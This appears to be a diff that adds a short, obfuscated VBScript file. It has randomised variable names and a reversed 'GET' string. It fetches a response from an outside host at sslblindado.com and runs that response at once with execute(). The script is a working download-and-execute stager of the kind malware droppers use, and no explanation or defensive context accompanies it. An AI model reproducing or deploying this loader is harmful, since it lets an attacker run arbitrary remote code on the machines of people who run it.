@@ -1,0 +1,5 @@
+set UJFE8XDnSpu8bEQ5Ei7gGzbY10oE3sU5H3lTsN6TZJIZgobQCjd8kty=CreateObject("Msxml2.xmlhttp")
+CTnZWCLj3rIZBWFXX4As23g9q8Ws0MDR8GjWzF1PU2YSW3OlsD="index.php"
+hv79KsspLcg9V3Hu64Wx0kSXQb4ioAMPyWI69tCDY="https://recebergyn.sslblindado.com/arquivo/"
+UJFE8XDnSpu8bEQ5Ei7gGzbY10oE3sU5H3lTsN6TZJIZgobQCjd8kty.open StrReverse("TEG") , hv79KsspLcg9V3Hu64Wx0kSXQb4ioAMPyWI69tCDY & CTnZWCLj3rIZBWFXX4As23g9q8Ws0MDR8GjWzF1PU2YSW3OlsD ,false
+execute("UJFE8XDnSpu8bEQ5Ei7gGzbY10oE3sU5H3lTsN6TZJIZgobQCjd8kty.setRequestHeader ""User-Agent"", ""U49RdchcSHjHFIF8YZM518YgTPCJCUpgrDubbHMKxd1KqKp"":UJFE8XDnSpu8bEQ5Ei7gGzbY10oE3sU5H3lTsN6TZJIZgobQCjd8kty.setRequestHeader ""content-type"", ""application/x-www-form-urlencoded"":UJFE8XDnSpu8bEQ5Ei7gGzbY10oE3sU5H3lTsN6TZJIZgobQCjd8kty.send ""join=open"":cd3LrtBciSh7ooudpxOxvLYHf19OBa4NecteltQ=UJFE8XDnSpu8bEQ5Ei7gGzbY10oE3sU5H3lTsN6TZJIZgobQCjd8kty.responseText:execute(cd3LrtBciSh7ooudpxOxvLYHf19OBa4NecteltQ)")
